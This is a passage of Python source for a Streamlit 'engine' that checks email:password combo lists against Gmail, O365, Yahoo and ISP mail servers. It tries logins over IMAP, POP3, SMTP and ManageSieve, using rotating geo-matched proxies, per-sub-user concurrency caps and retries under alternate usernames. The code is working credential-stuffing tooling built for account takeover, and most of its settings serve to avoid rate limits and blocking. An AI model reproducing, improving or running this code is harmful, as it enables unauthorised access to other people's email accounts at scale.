    if not subuser:
        return _null_gate
    with STATE["host_gate_lock"]:
        gates = STATE["subuser_gates"]
        g = gates.get(subuser)
        if g is None:
            try:
                limit = int(CFG.get("PROXY_SUBUSER_CONCURRENCY",
                                    PROXY_SUBUSER_CONCURRENCY_DEFAULT)) \
                    or PROXY_SUBUSER_CONCURRENCY_DEFAULT
            except Exception:
                limit = PROXY_SUBUSER_CONCURRENCY_DEFAULT
            g = threading.BoundedSemaphore(max(1, limit))
            gates[subuser] = g
        return g


def _reset_gates():
    """Rebuild every gate (called when settings are applied)."""
    with STATE["host_gate_lock"]:
        STATE["host_gates"] = {}
        STATE["ip_gates"] = {}
        STATE["subuser_gates"] = {}
    STATE["proxy_gate"] = None
    log_probe_event("concurrency gates rebuilt")
# @@END 040 GATES

# @@BLOCK 041 PROXY_407_PARK deps=016,039,040
def _proxy_407_parked(proxy_str) -> bool:
    if not proxy_str:
        return False
    until = (STATE.get("proxy_407_until") or {}).get(proxy_str, 0.0)
    return until > time.time()


def _park_proxy_407(proxy_str):
    """Park a 407'd node briefly instead of killing it for the run."""
    if not proxy_str:
        return
    try:
        STATE.setdefault("proxy_407_until", {})[proxy_str] = time.time() + PROXY_407_COOLDOWN
    except Exception:
        pass


def _gated_tunnel(proxy_str, timeout=None):
    """Run tunnel_probe() behind the proxy gate, the per-IP gate and the
    per-SUB-USER gate."""
    info = parse_proxy(proxy_str)
    base_wait = max(3.0, float(timeout if timeout is not None else probe_timeout()) + 2.0)
    wait = _gate_wait(base_wait)
    got_proxy = got_ip = got_sub = False
    pg = _proxy_gate()
    ig = _ip_gate(info["host"] if info else None)
    sg = _subuser_gate((info.get("user") or "").lower() if info else "")
    try:
        try:
            got_proxy = pg.acquire(timeout=wait)
        except Exception:
            got_proxy = False
        try:
            got_ip = ig.acquire(timeout=wait)
        except Exception:
            got_ip = False
        try:
            got_sub = sg.acquire(timeout=wait)
        except Exception:
            got_sub = False
        return tunnel_probe(proxy_str, timeout=timeout)
    finally:
        if got_sub:
            try:
                sg.release()
            except Exception:
                pass
        if got_ip:
            try:
                ig.release()
            except Exception:
                pass
        if got_proxy:
            try:
                pg.release()
            except Exception:
                pass
# @@END 041 PROXY_407_PARK

# @@BLOCK 042 CHECKER_CONFIG deps=009
@dataclass
class CheckerConfig:
    mode_name: str = "Normal"
    fast_mode: bool = False
    max_concurrent_checks: int = 50
    connect_timeout: float = 8.0
    max_retries: int = 2
    failure_cooldown: float = FAILURE_COOLDOWN_DEFAULT
# @@END 042 CHECKER_CONFIG

# @@BLOCK 043 SECRETS_BRIDGE deps=038
def _secret_to_env(k, v):
    if v is None:
        return
    if isinstance(v, (list, tuple)):
        os.environ[str(k)] = "\n".join(str(x) for x in v if x is not None)
        return
    if isinstance(v, dict):
        return
    os.environ[str(k)] = str(v)


try:
    for k, v in str_lit.secrets.items():
        _secret_to_env(k, v)
    log_startup("Successfully bridged Streamlit secrets to environment variables.")
except Exception as e:
    log_startup(f"WARNING: Failed to bridge secrets to environment: {e}")

WEBSHARE_KEYS = [line.strip() for line in os.getenv("WEBSHARE_KEYS", "").splitlines()
                 if line.strip()]
OXYLABS_PROXIES = [line.strip() for line in
                   (os.getenv("OXYLABS_BASE") or os.getenv("OXYLABS_PROXIES") or "").splitlines()
                   if line.strip()]
log_startup(f"Secrets keys: webshare={len(WEBSHARE_KEYS)} oxylabs={len(OXYLABS_PROXIES)}")
# @@END 043 SECRETS_BRIDGE

# @@BLOCK 044 HELP_WIDGET deps=043
if "help_states" not in str_lit.session_state:
    str_lit.session_state.help_states = {}


def instant_help(key_name, description_text, label_text, widget_type="label", **kwargs):
    try:
        if key_name not in str_lit.session_state.help_states:
            str_lit.session_state.help_states[key_name] = {"visible": False, "time": 0}

        state_data = str_lit.session_state.help_states[key_name]
        if state_data.get("visible", False) and time.time() - state_data.get("time", 0) > 10.0:
            str_lit.session_state.help_states[key_name]["visible"] = False

        col_lbl, col_btn = str_lit.sidebar.columns([0.85, 0.15])
        val = None
        with col_lbl:
            if widget_type == "label":
                str_lit.markdown(f"**{label_text}**")
            elif widget_type == "checkbox":
                try:
                    val = str_lit.checkbox(label_text, value=kwargs.get("value", False),
                                           key=f"chk_{key_name}")
                except Exception as widget_err:
                    str_lit.error(f"Widget payload/input error: {widget_err}")
                    val = kwargs.get("value", False)
            elif widget_type in ("text", "selectbox"):
                str_lit.markdown(f"**{label_text}**")

        with col_btn:
            if str_lit.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
                try:
                    current = str_lit.session_state.help_states[key_name]["visible"]
                    str_lit.session_state.help_states[key_name] = {
                        "visible": not current, "time": time.time()}
                except Exception as btn_err:
                    warnings.warn(f"State transition error in help button: {btn_err}")

        if str_lit.session_state.help_states[key_name]["visible"]:
            str_lit.sidebar.markdown(
                f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)

        if widget_type == "checkbox":
            return val
    except Exception as e:
        warnings.warn(f"Error rendering instant help widget {key_name}: {e}")
    return None
# @@END 044 HELP_WIDGET

# @@BLOCK 045 SETTINGS_RESET deps=019,020,024,040,043
def _apply_settings_reset(reason: str = "Reset Defaults"):
    """Restore EVERY settings widget to its default and stamp applied_cfg from
    the pure-constant default_cfg()."""
    for k, v in SETTING_DEFAULTS.items():
        try:
            str_lit.session_state[k] = list(v) if isinstance(v, list) else v
        except Exception:
            pass
    try:
        str_lit.session_state.pool_mode = "all"
        str_lit.session_state.pool_locked = True
        str_lit.session_state.pool_pick = None
        str_lit.session_state.picked_countries = []
    except Exception:
        pass
    try:
        str_lit.session_state.applied_cfg = default_cfg()
        str_lit.session_state.applied_cfg_version = CFG_VERSION
    except Exception:
        pass
    try:
        str_lit.session_state["_bb_prefilter_cache"] = None
    except Exception:
        pass
    _reset_gates()
    log_startup(f"All settings reset to UNIVERSAL DEFAULTS by {reason}.")
    log_probe_event(f"settings reset to universal defaults ({reason})")


_reset_all_settings = _apply_settings_reset

if str_lit.session_state.pop("_bb_reset_pending", False):
    _apply_settings_reset("Reset Defaults button")
# @@END 045 SETTINGS_RESET

# @@BLOCK 046 SIDEBAR_MODE deps=009,042,043,044
str_lit.sidebar.header("⚙ Engine Control Panel")
str_lit.sidebar.caption(
    "Universal defaults are pre-set for ANY mix of combos (Gmail / O365 / Yahoo / "
    "legacy ISP). The engine dials IMAP + POP3 by default, so a legacy IMAP front "
    "that sends '* BYE' has a second, independent protocol to fall back to."
)
str_lit.sidebar.caption(
    "ℹ️ Seeing **`TypeError: Importing a module script failed.`** in red? That is the "
    "BROWSER holding a stale JavaScript chunk after a redeploy - hard-refresh the tab "
    "(Ctrl/Cmd+Shift+R). It is not an app error."
)

checker_mode = str_lit.sidebar.selectbox(
    "⚡ Select Engine Mode:",
    options=["Normal Mode", "Fast Mode", "Deep / Aggressive Mode"],
    index=0,
    key="ui_mode",
    help="Normal: balanced and safe for legacy ISP IMAP. Fast: syntax + MX pre-filter, "
         "rapid ports. Deep: maximum depth, multiple fallbacks, strict validation."
)

if checker_mode == "Fast Mode":
    engine_config = CheckerConfig(mode_name="Fast", fast_mode=True, max_concurrent_checks=100,
                                  connect_timeout=5.0, max_retries=1, failure_cooldown=60.0)
    workers = str_lit.sidebar.slider("Workers Start", 1, 100, WORKERS_FAST, 1, key="ui_workers")
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 10, 300, int(DEADLINE_FAST), 5,
                                      key="ui_deadline")
    timeout = str_lit.sidebar.slider("Timeout", 3, 40, ATTEMPT_TIMEOUT_FAST, 1, key="ui_timeout")
    default_hosts = 2
elif checker_mode == "Deep / Aggressive Mode":
    engine_config = CheckerConfig(mode_name="Deep", fast_mode=False, max_concurrent_checks=30,
                                  connect_timeout=12.0, max_retries=4, failure_cooldown=20.0)
    workers = str_lit.sidebar.slider("Workers Start", 1, 50, WORKERS_DEEP, 1, key="ui_workers")
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 15, 400, int(DEADLINE_DEEP), 5,
                                      key="ui_deadline")
    timeout = str_lit.sidebar.slider("Timeout", 5, 60, ATTEMPT_TIMEOUT_DEEP, 1, key="ui_timeout")
    default_hosts = 4
else:
    engine_config = CheckerConfig(mode_name="Normal", fast_mode=False, max_concurrent_checks=50,
                                  connect_timeout=8.0, max_retries=2,
                                  failure_cooldown=FAILURE_COOLDOWN_DEFAULT)
    workers = str_lit.sidebar.slider("Workers Start", 1, 100, WORKERS_NORMAL, 1, key="ui_workers")
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 10, 300, int(DEADLINE_NORMAL), 5,
                                      key="ui_deadline")
    timeout = str_lit.sidebar.slider("Timeout", 3, 40, ATTEMPT_TIMEOUT_NORMAL, 1, key="ui_timeout")
    default_hosts = 3

max_acc = str_lit.sidebar.slider("Max Accounts", 0, 5000, 5000, 100, key="ui_max_acc")
blacklist_cf = str_lit.sidebar.slider(
    "Blacklist CF (consecutive proxy fails)", 3, 100, BLACKLIST_CF_DEFAULT, 1,
    key="ui_blacklist_cf",
    help="A proxy is circuit-broken for 30s after this many consecutive network failures."
)
# @@END 046 SIDEBAR_MODE

# @@BLOCK 047 SIDEBAR_PROTOCOLS deps=011,046
protocol_pick = str_lit.sidebar.multiselect(
    "🧩 Pick Protocols Mode",
    options=PROTOCOL_OPTIONS,
    default=PROTOCOL_SELECTION_DEFAULT,
    key="ui_protocols",
    help="Which protocols the engine is allowed to DIAL. DEFAULT IS IMAP + POP3 - POP3 is "
         "the only independent path when a legacy IMAP front answers LOGIN with '* BYE' "
         "and hangs up.\n\n"
         "IMAP - 993 (TLS) / 143 (STARTTLS / plain). The default and the one that matters "
         "most.\n"
         "POP3 - 995 (TLS) / 110 (STLS / plain). A completely separate code path: "
         "different port, different daemon, different IP-reputation bucket.\n"
         "SMTP - submission AUTH on 587 -> 465 -> 25. CONFIRM-ONLY.\n"
         "ManageSieve - 4190. CONFIRM-ONLY, same credentials, sometimes open when IMAP is not."
)
if not protocol_pick:
    str_lit.sidebar.caption("⚠ Nothing ticked - falling back to IMAP.")
else:
    str_lit.sidebar.caption(
        "Dialling: **" + " + ".join(protocol_pick) + "**"
        + ("  ·  SMTP/ManageSieve are confirm-only"
           if any(p in ("SMTP", "ManageSieve") for p in protocol_pick) else ""))
# @@END 047 SIDEBAR_PROTOCOLS

# @@BLOCK 048 SIDEBAR_RULES deps=046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🎛 Advanced Control Rules")
dynamic_worker_scaling = str_lit.sidebar.toggle(
    "⚡ Thread Auto-Scaling / Dynamic Workers", value=True, key="ui_dynamic_scaling",
    help="Let the engine scale worker threads with live network conditions.")
max_hosts_per_domain = str_lit.sidebar.slider(
    "Max Hosts Per Domain", 1, 8, default_hosts, 1, key="ui_max_hosts",
    help="How many discovered IMAP hosts to try per account. STARTTLS / plain and POP "
         "rungs are capped separately."
)
try_alt_username_ui = str_lit.sidebar.toggle(
    "Try local-part username on auth failure", value=True, key="ui_alt_user",
    help="Many legacy ISP servers (Zimbra / cPanel / Dovecot) expect 'user' rather than "
         "'user@domain'. On an auth rejection the engine holds the node and retries the "
         "SAME host with the local part. This also fires on a LOGIN_DROPPED (* BYE), not "
         "just WRONG. Not applied to SMTP."
)
confirm_wrong_ui = str_lit.sidebar.toggle(
    "✅ Confirm a WRONG verdict across hosts before accepting it", value=True,
    key="ui_confirm_wrong",
    help="GUARD. ON (default): a single AUTHENTICATIONFAILED is PROVISIONAL - the ladder "
         "keeps going (POP3, the sibling hosts, 143/110, then DIRECT) until a SECOND host "
         "agrees or nothing is left to dial. A single host is NOT authoritative: "
         "imap.<domain> is often a different box from the mailbox's real host, and it "
         "answers AUTHENTICATIONFAILED for accounts it has never heard of. OFF: restore "
         "the one-rung behaviour (faster on huge lists, more false wrong_password)."
)

smtp_precheck_ui = str_lit.sidebar.checkbox(
    "📮 Enable SMTP pre-check  (OFF by default)",
    value=False, key="ui_smtp_precheck",
    help="A REACHABILITY banner probe only (220 on 587/465/25) - it never authenticates. "
         "Separate from the SMTP protocol rung in Pick Protocols Mode, which does AUTH PLAIN."
)

custom_whitelist_input = str_lit.sidebar.text_input(
    "Custom Whitelist Domains (comma-separated)", placeholder="gmail.com, outlook.com")
custom_blacklist_input = str_lit.sidebar.text_input(
    "Custom Blacklist Domains (comma-separated)", placeholder="spamdomain.com")
# @@END 048 SIDEBAR_RULES

# @@BLOCK 049 SIDEBAR_POOL deps=016,017,018,046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🌐 Proxy / Pool Configuration")
min_proxy_score = str_lit.sidebar.slider(
    "Min Proxy Score", 0, 100, MIN_PROXY_SCORE_DEFAULT, 10, key="ui_min_proxy_score",
    help="A node is dropped from the pool once its score falls below this."
)
proxy_precheck_timeout = str_lit.sidebar.slider(
    "Proxy Pre-Check Timeout (Sec)", 1, 10, PROXY_PRECHECK_TIMEOUT_DEFAULT, 1,
    key="ui_probe_precheck_timeout"
)
probe_timeout_ui = str_lit.sidebar.slider(
    "Tunnel Probe Timeout (Sec)", 3, 20, int(PROBE_TIMEOUT_DEFAULT), 1, key="ui_probe_timeout",
    help="How long a node gets IN TOTAL to open a real CONNECT tunnel to any probe target."
)
probe_target_ui = str_lit.sidebar.selectbox(
    "Tunnel Probe Target",
    PROBE_TARGET_OPTIONS,
    index=_safe_index(PROBE_TARGET_OPTIONS, PROBE_TARGET_DEFAULT),
    key="ui_probe_target",
    help="DEFAULT '443 (HTTPS)': the probe dials api.ipify.org:443, which is NOT a mail "
         "server, so ALL probe traffic lands on your provider's WEBSITES meter instead of "
         "the EMAIL-SERVERS meter."
)
probe_strict_ui = str_lit.sidebar.toggle(
    "Strict tunnel probe", value=True, key="ui_probe_strict",
    help="ON (default): only nodes that pass the probe enter the live pool, so 'Alive: 0' "
         "means what it says."
)
probe_max_targets_ui = str_lit.sidebar.slider(
    "Probe: max targets per node", 1, 3, PROBE_MAX_TARGETS_DEFAULT, 1, key="ui_probe_maxtargets",
    help="1 (default) = AUTO resolves the SINGLE dominant mail host in your queue."
)
probe_second_scheme_ui = str_lit.sidebar.toggle(
    "Probe: also try the second proxy scheme", value=PROBE_SECOND_SCHEME_DEFAULT,
    key="ui_probe_scheme2",
    help="OFF (default) = one CONNECT per probe when the first scheme PASSES. The alternate "
         "scheme is ALWAYS tried after a FAILURE regardless of this switch."
)
prober_idle_ui = str_lit.sidebar.toggle(
    "Probe: keep probing in the background while idle",
    value=PROBER_IDLE_ENABLED_DEFAULT, key="ui_prober_idle",
    help="OFF (default) = the pool is probed once when the page loads, then only when you "
         "click Start or Re-probe."
)
mail_spot_ui = str_lit.sidebar.toggle(
    "✉️ Spot-check the pool against a MAIL destination", value=MAIL_SPOT_CHECK_DEFAULT,
    key="ui_mail_spot",
    help="After every probe cycle, CONNECT 3 random nodes to your first queued mail host "
         "(fallback imap.gmail.com:993) and report it. Without this a provider "
         "'email servers' cap looks exactly like a perfectly healthy pool right up until "
         "the run 407s on every account."
)
probe_sample_ui = str_lit.sidebar.slider(
    "Probe: max nodes per cycle (0 = all)", 0, 200, 0, 5, key="ui_probe_sample",
    help="Randomly sample this many nodes per cycle instead of probing the whole file. "
         "Cheapest is 20."
)
dedupe_proxies_ui = str_lit.sidebar.toggle(
    "Deduplicate proxy pool", value=True, key="ui_dedupe",
    help="ON (default): collapse repeated host:port lines in proxies.txt."
)
allow_blacklist_ips = str_lit.sidebar.toggle(
    "Allow Blacklisted / Flagged Proxy IPs", value=False, key="ui_allow_blacklist",
    help="When disabled (default), circuit-broken proxies are excluded from BOTH the pool "
         "AND the live ladder."
)
proxy_quarantine_ui = str_lit.sidebar.toggle(
    "🩹 Quarantine nodes that return 407", value=True, key="ui_quarantine",
    help="ON (default): a node that answers '407 Proxy Authentication Required' THREE "
         "times is pulled out of the pool for the rest of the run. A plain socket reset "
         "is NOT a 407."
)
# @@END 049 SIDEBAR_POOL

# @@BLOCK 050 SIDEBAR_CONCURRENCY deps=012,017,046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🚦 Concurrency Governors")
host_concurrency_ui = str_lit.sidebar.slider(
    "Per-Host Connection Cap", 1, 12, HOST_CONCURRENCY_DEFAULT, 1, key="ui_host_conc",
    help="Max simultaneous connections to ONE mail hostname. 2 is right for legacy ISP IMAP."
)
proxy_ip_concurrency_ui = str_lit.sidebar.slider(
    "Per-Proxy-IP Connection Cap", 1, 12, PROXY_IP_CONCURRENCY_DEFAULT, 1, key="ui_ip_conc",
    help="Default 1. Max simultaneous tunnels through ONE proxy IP, for the CHECKER and "
         "the PROBER alike."
)
proxy_subuser_concurrency_ui = str_lit.sidebar.slider(
    "Per-Proxy-SUBUSER Connection Cap", 1, 12, PROXY_SUBUSER_CONCURRENCY_DEFAULT, 1,
    key="ui_subuser_conc",
    help="Default 1. Providers rate-limit PER SUB-USER - a 407 is what you get when that "
         "cap is exceeded, NOT because the node is dead. The single most important 407 "
         "control in the app."
)
proxy_concurrency_ui = str_lit.sidebar.slider(
    "Global Proxy Connection Cap", 2, 60, PROXY_CONCURRENCY_DEFAULT, 1, key="ui_proxy_conc",
    help="Max simultaneous proxy tunnels across the whole run (the prober shares this)."
)
direct_first_ui = str_lit.sidebar.toggle(
    "⚡ Direct-First (try the direct egress before the proxy)", value=False,
    key="ui_direct_first",
    help="ON: run the DIRECT sweep first and only fall back to the proxy. Also auto-engages "
         "per account when >50% of the pool is quarantined."
)
same_host_retries_ui = str_lit.sidebar.slider(
    "Same-Host Retries on a SLOW answer", 0, 4, SAME_HOST_RETRIES_DEFAULT, 1,
    key="ui_same_host_retries",
    help="Only applies to READ-level slowness."
)
max_rotations_ui = str_lit.sidebar.slider(
    "Max proxy rotations per rung", 0, 8, MAX_ROTATIONS_DEFAULT, 1, key="ui_max_rot",
    help="Every rotation is another proxy request. 5 -> 2 is roughly a 60% cut in the "
         "worst case."
)
pass2_ui = str_lit.sidebar.toggle(
    "Second pass over network-failed hosts", value=CHECK_PASS2_DEFAULT, key="ui_pass2",
    help="OFF (default) = one pass over the ladder. ON = re-dial every host that failed "
         "with a NETWORK error."
)
# @@END 050 SIDEBAR_CONCURRENCY

# @@BLOCK 051 SIDEBAR_ROUTING deps=046
str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🔀 Proxy Routing Intelligence")
proxy_random_rotation = str_lit.sidebar.toggle(
    "🔀 Proxy Random Rotation", value=True, key="ui_random_rot",
    help="ON (default): a DIFFERENT random node is used for every attempt, with a "
         "per-account avoid-set."
)
geo_call_proxy = str_lit.sidebar.toggle(
    "🌍 Geo-Call Proxy", value=False, key="ui_geo_call",
    help="Prefer a node whose geo matches the email's country/region. Falls back to the "
         "general pool on failure."
)
my_connection = str_lit.sidebar.selectbox(
    "📶 My own connection (stamped on direct fallbacks)", ["Auto", "VPN ON", "VPN OFF"],
    index=0, key="ui_conn_hint", help="Diagnostic only."
)
# @@END 051 SIDEBAR_ROUTING

# @@BLOCK 052 CACHE_PROXY_PARSE_PICKER deps=024,039,051
if "pool_mode" not in str_lit.session_state:
    str_lit.session_state.pool_mode = "all"
if "pool_locked" not in str_lit.session_state:
    str_lit.session_state.pool_locked = True
if "picked_countries" not in str_lit.session_state:
    str_lit.session_state.picked_countries = []


def load_json(path, default=None):
    if default is None:
        default = {}
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
                log_startup(f"Successfully loaded JSON cache from {path}.")
                return data
        except Exception as e:
            log_startup(f"WARNING: Failed to load JSON file {path}: {e}")
            return default
    log_startup(f"JSON cache file {path} not found. Using default.")
    return default


domain_cache = load_json("domain_cache.json", {})
proxy_meta = STATE["meta"]


def load_proxies(quiet: bool = False):
    """Proxies come from proxies.txt only."""
    if not os.path.exists("proxies.txt"):
        try:
            with file_write_lock:
                with open("proxies.txt", "w", encoding="utf-8") as f:
                    if OXYLABS_PROXIES:
                        f.write("\n".join(OXYLABS_PROXIES) + "\n")
            log_startup(f"Created proxies.txt (seeded from secrets: "
                        f"{len(OXYLABS_PROXIES)}).", quiet=quiet)
        except Exception as e:
            log_startup(f"WARNING: Failed to initialize proxies.txt: {e}", quiet=quiet)
    try:
        with open("proxies.txt", encoding="utf-8", errors="ignore") as f:
            raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        try:
            dedupe = bool(CFG.get("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT))
        except Exception:
            dedupe = DEDUPE_PROXIES_DEFAULT
        if dedupe:
            uniq = list(dict.fromkeys(raw_list))
            if len(uniq) != len(raw_list):
                log_startup(f"Loaded {len(raw_list)} proxies from proxies.txt "
                            f"({len(uniq)} unique after dedupe).", quiet=quiet)
            raw_list = uniq
        else:
            log_startup(f"Loaded {len(raw_list)} proxies from proxies.txt.", quiet=quiet)
        return raw_list
    except Exception as e:
        log_startup(f"WARNING: Failed to read proxies.txt: {e}", quiet=quiet)
        return []


def compute_real_score(success_count, fail_count, initial_latency_score=80):
    try:
        if (success_count + fail_count) == 0:
            return initial_latency_score
        sr = ((success_count + 2) / (success_count + fail_count + 3)) * 100
        return max(0, min(100, int(sr - (fail_count * 5))))
    except Exception:
        return initial_latency_score


def is_proxy_alive(proxy_host, proxy_port, timeout=2):
    try:
        with socket.create_connection((proxy_host, int(proxy_port)), timeout=timeout):
            return True
    except Exception:
        return False


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    try:
        p = proxy_str.strip()
        if "://" in p:
            u = urlparse(p)
            return {"host": u.hostname, "port": u.port or 80,
                    "user": u.username, "pass": u.password}
        if "@" in p:
            cred, hostpart = p.rsplit("@", 1)
            user, pwd = cred.split(":", 1)
            host, port = hostpart.split(":", 1)
            return {"host": host, "port": int(port), "user": user, "pass": pwd}
        parts = p.split(":")
        if len(parts) == 4:
            return {"host": parts[0], "port": int(parts[1]),
                    "user": parts[2], "pass": parts[3]}
        if len(parts) == 2:
            return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
    except Exception:
        pass
    return None


def proxy_is_quarantined(proxy_str) -> bool:
    if not proxy_str:
        return False
    with proxy_quarantine_lock:
        return proxy_str in proxy_quarantine


def quarantine_proxy(proxy_str, reason=""):
    if not proxy_str:
        return False
    with proxy_quarantine_lock:
        if proxy_str in proxy_quarantine:
            return False
        proxy_quarantine.add(proxy_str)
        size = len(proxy_quarantine)
    with alive_pool_lock:
        total = len(alive_pool)
    log_startup(f"Proxy quarantined ({reason or '407'}): {proxy_str} "
                f"[{size} quarantined / {total} alive]", quiet=True)
    log_probe_event(f"QUARANTINE {proxy_str} ({reason or '407'}) [{size}/{total}]")
    return True


def quarantine_size() -> int:
    with proxy_quarantine_lock:
        return len(proxy_quarantine)


def clear_proxy_quarantine():
    with proxy_quarantine_lock:
        proxy_quarantine.clear()
    _proxy_407.clear()
    try:
        STATE.setdefault("proxy_407_until", {}).clear()
    except Exception:
        pass
    log_probe_event("quarantine cleared by user")


def _scheme_order(proxy_str):
    """Try the scheme that last worked for this node FIRST. HTTP is the default."""
    with _proxy_scheme_lock:
        pref = _proxy_scheme.get(proxy_str)
    if pref == socks.SOCKS5:
        return (socks.SOCKS5, socks.HTTP)
    return (socks.HTTP, socks.SOCKS5)


def _remember_scheme(proxy_str, ptype):
    with _proxy_scheme_lock:
        _proxy_scheme[proxy_str] = ptype


def geo_lookup(ip):
    """Country/region for an IP.

    The throttle RESERVES its slot under the lock and sleeps OUTSIDE it, and the
    reservation is PAID - the sleep equals the gap.  A capped sleep let the
    reservation grow without bound against ip-api's 45/min tier.
    """
    if not ip or ip == "Unknown":
        return ("Unknown", "Unknown")
    now = time.time()
    with _GEO_LOCK:
        hit = _GEO_CACHE.get(ip)
        if hit:
            return hit
        failed = _GEO_FAIL.get(ip)
        if failed and (now - failed) < GEO_FAIL_TTL:
            return ("Unknown", "Unknown")
        wait = max(0.0, _geo_last_call["ts"] + GEO_MIN_INTERVAL - now)
        _geo_last_call["ts"] = now + wait
    if wait > 0:
        time.sleep(min(wait, 3.0))

    country, region, ok = "Unknown", "Unknown", False
    try:
        if requests is not None:
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName",
                             timeout=3)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    country = data.get("country") or "Unknown"
                    region = data.get("regionName") or "Unknown"
                    ok = True
    except Exception:
        ok = False

    with _GEO_LOCK:
        if ok:
            _GEO_CACHE[ip] = (country, region)
            _GEO_FAIL.pop(ip, None)
        else:
            _GEO_FAIL[ip] = time.time()
    return country, region


def public_ip(force=False):
    if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < GEO_CACHE_TTL:
        return _PUBLIC_IP["ip"]
    with _PUBLIC_IP_LOCK:
        if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < GEO_CACHE_TTL:
            return _PUBLIC_IP["ip"]
        ip = ""
        try:
            if requests is not None:
                ip = (requests.get("https://api.ipify.org", timeout=3).text or "").strip()
        except Exception:
            ip = ""
        if not ip:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
            except Exception:
                ip = ""
        if ip:
            _PUBLIC_IP.update(ip=ip, ts=time.time())
        return ip or "Unknown"


def direct_isp(force=False):
    if not force and _DIRECT_ISP["isp"] and time.time() - _DIRECT_ISP["ts"] < GEO_CACHE_TTL:
        return _DIRECT_ISP["isp"]
    ip = public_ip()
    isp = ""
    try:
        if requests is not None and ip and ip != "Unknown":
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,org,as", timeout=3)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    isp = " ".join(str(data.get(k) or "") for k in ("isp", "org", "as")).strip()
    except Exception:
        isp = ""
    _DIRECT_ISP.update(isp=isp, ts=time.time())
    return isp


_VPN_BRANDS = (
    "vpn", "nordvpn", "mullvad", "proton", "expressvpn", "surfshark", "cyberghost",
    "private internet", "ipvanish", "windscribe", "tunnelbear", "hide.me", "purevpn",
    "astrill", "vyprvpn", "hotspot shield", "ivacy", "torguard", "perfect privacy",
    "azirevpn", "airvpn", "openvpn", "wireguard",
)
_VPN_TOKENS = _VPN_BRANDS


def vpn_state_label():
    """Say so when the lookup failed instead of asserting VPN OFF."""
    hint = CFG.get("CONNECTION_HINT", "Auto")
    if hint in ("VPN ON", "VPN OFF"):
        return hint
    isp = (direct_isp() or "").lower()
    if not isp:
        return "VPN ? (lookup failed)"
    if any(t in isp for t in _VPN_BRANDS):
        return "VPN ON (auto)"
    return "VPN OFF (auto)"


def direct_geo(force=False):
    if not force and time.time() - _DIRECT_GEO["ts"] < GEO_CACHE_TTL and _DIRECT_GEO["ip"]:
        return dict(_DIRECT_GEO)
    with _DIRECT_GEO_LOCK:
        if not force and time.time() - _DIRECT_GEO["ts"] < GEO_CACHE_TTL and _DIRECT_GEO["ip"]:
            return dict(_DIRECT_GEO)
        ip = public_ip(force=force)
        country, region = geo_lookup(ip)
        _DIRECT_GEO.update(ts=time.time(), ip=ip, country=country,
                           region=region, vpn=vpn_state_label())
        return dict(_DIRECT_GEO)


TLD_COUNTRY = {
    "de": "Germany", "at": "Austria", "ch": "Switzerland", "fr": "France",
    "it": "Italy", "es": "Spain", "pt": "Portugal", "nl": "Netherlands",
    "be": "Belgium", "pl": "Poland", "se": "Sweden", "no": "Norway",
    "dk": "Denmark", "fi": "Finland", "ie": "Ireland", "cz": "Czechia",
    "sk": "Slovakia", "gr": "Greece", "ro": "Romania", "hu": "Hungary",
    "uk": "United Kingdom", "gb": "United Kingdom", "ca": "Canada",
    "us": "United States", "au": "Australia", "nz": "New Zealand",
    "br": "Brazil", "mx": "Mexico", "ar": "Argentina", "cl": "Chile",
    "jp": "Japan", "kr": "South Korea", "in": "India", "tr": "Turkey",
    "za": "South Africa", "ru": "Russia", "ua": "Ukraine", "il": "Israel",
    "lt": "Lithuania", "lv": "Latvia", "ee": "Estonia", "bg": "Bulgaria",
    "hr": "Croatia", "si": "Slovenia", "rs": "Serbia",
}


def tld_country(domain):
    """Country for GEO_CALL.  .com/.net ISPs are covered by the hint map."""
    d = (domain or "").lower().strip()
    if d in DOMAIN_COUNTRY_HINTS:
        return DOMAIN_COUNTRY_HINTS[d]
    for part in reversed(d.split(".")):
        if part in TLD_COUNTRY:
            return TLD_COUNTRY[part]
    return None


def enrich_proxy_geo(proxies, max_workers=8):
    todo = []
    for p in proxies:
        meta = proxy_meta.get(p)
        if not meta or not meta.get("country") or meta.get("country") == "Unknown":
            info = parse_proxy(p)
            if info:
                todo.append((p, info["host"]))
    if not todo:
        return

    def _one(item):
        p, host = item
        return p, host, geo_lookup(host)

    try:
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            for p, host, (country, region) in ex.map(_one, todo):
                with proxy_lock:
                    m = proxy_meta.setdefault(
                        p, {"fails": 0, "success": 0, "score": 60, "latency_ms": 0})
                    m["country"], m["region"] = country, region
    except Exception as e:
        log_startup(f"WARNING: proxy geo enrichment error: {e}", quiet=True)


def get_available_countries_with_scores():
    try:
        raw = load_proxies()
        country_scores = defaultdict(list)
        for p in raw:
            meta = proxy_meta.get(p, {})
            c = str(meta.get("country", "Unknown")).upper()
            if c == "UNKNOWN" or not c:
                info = parse_proxy(p)
                if info:
                    c = geo_lookup(info["host"])[0].upper()
            country_scores[c].append(meta.get("score", 50))
        ranked = sorted(((c, sum(s) / len(s)) for c, s in country_scores.items() if s),
                        key=lambda x: x[1], reverse=True)
        return [c for c, _ in ranked if c != "UNKNOWN"] + (["UNKNOWN"] if "UNKNOWN" in country_scores else [])
    except Exception:
        return []


if "pool_pick" not in str_lit.session_state:
